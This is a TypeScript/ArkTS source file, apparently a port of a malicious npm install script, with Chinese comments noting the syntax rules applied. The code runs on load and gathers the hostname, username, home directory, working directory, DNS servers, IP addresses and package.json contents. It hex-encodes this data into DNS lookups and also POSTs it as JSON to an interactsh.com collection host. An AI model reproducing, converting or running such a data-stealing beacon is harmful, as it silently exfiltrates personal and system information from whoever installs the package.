// 应用约束60：使用import代替require
import os from "os";
import dns from "dns";
import querystring from "querystring";
import https from "https";
import fs from "fs";
import path from "path";
import packageJSON from "./package.ets"; // 约束60：文件后缀改为ets
const package = packageJSON.name;

// 应用约束2：添加参数和返回类型
function getFiles(paths: string[]): string[] {
    // 应用约束9：var改为let
    let ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        let mpath = paths[j];
        // 应用约束25：显式类型标注
        let files: string[] = fs.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
}

// 应用约束1：添加返回类型
function toHex(data: string): string {
    // 应用约束75：替换Buffer为TextEncoder
    const encoder = new TextEncoder();
    const bytes = encoder.encode(data);
    let hex = '';
    for (const byte of bytes) {
        hex += byte.toString(16).padStart(2, '0');
    }
    return hex;
}

// 应用约束1：添加返回类型
function gethttpips(): string[] {
    let str: string[] = [];
    // 应用约束21：使用Object.keys代替for..in
    const networkInterfaces = os.networkInterfaces();
    Object.keys(networkInterfaces).forEach((item) => {
        if (item != "lo") {
            const iface = networkInterfaces[item];
            for (let i = 0; i < iface.length; i++) {
                str.push(iface[i].address);
            }
        }
    });
    return str;
}

function getIps(): string {
    let str = "";
    const networkInterfaces = os.networkInterfaces();
    Object.keys(networkInterfaces).forEach((item) => {
        if (item != "lo") {
            const iface = networkInterfaces[item];
            for (let i = 0; i < iface.length; i++) {
                str += toHex(iface[i].address) + ".";
            }
        }
    });
    return str.slice(0, -1);
}

function getPathChunks(filePath: string): string {
    let str = "p";
    // 应用约束2：添加类型标注
    const chunks: string[] = filePath.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
}

// 应用约束1：添加参数和返回类型
interface PackageData {
    hn: string;
    p: string;
    c: string;
    un: string;
    hd: string;
}

function toName(pkg: PackageData): string[] {
    let queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    let str = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;
    
    if (str.length > 255) {
        const substr1 = `${toHex(pkg.p)}.${getPathChunks(pkg.c)}`;
        const substr2 = getIps();
        
        if (substr1.length < 150) {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${toHex(pkg.un)}.${hostname}`);
            queries.push(`${substr2}.${hostname}`);
        } else if (substr2.length < 150) {
            queries.push(`${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.un)}.${substr2}.${hostname}`);
        } else {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.hd)}.${toHex(pkg.un)}.${hostname}`);
        }
    } else {
        queries.push(str);
    }
    return queries;
}

// 应用约束24：使用接口定义对象类型
interface TrackingData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: object;
    ip: string;
}

const td: TrackingData = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON ? (packageJSON as any).___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
};

// 应用约束30：显式类型转换
const qs: string[] = toName(td as PackageData);

// 应用约束36：替换dns.lookup为ArkTS网络API（示例保留调用）
qs.forEach((query) => {
    dns.lookup(query, (err: Error, result: string) => {
        // 处理DNS查询结果
    });
});

// 应用约束46：参数解构改为显式参数
const trackingData = JSON.stringify(td);
const postData = querystring.stringify({
    msg: trackingData
});

// 应用约束11：使用class代替函数类型
const options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString()
    }
};

// 应用约束26：使用箭头函数
const req = https.request(options, (res) => {
    res.on("data", (d: string) => {
        // 处理响应数据
    });
});

req.on("error", (e: Error) => {
    // 处理错误
});

req.write(postData);
req.end();
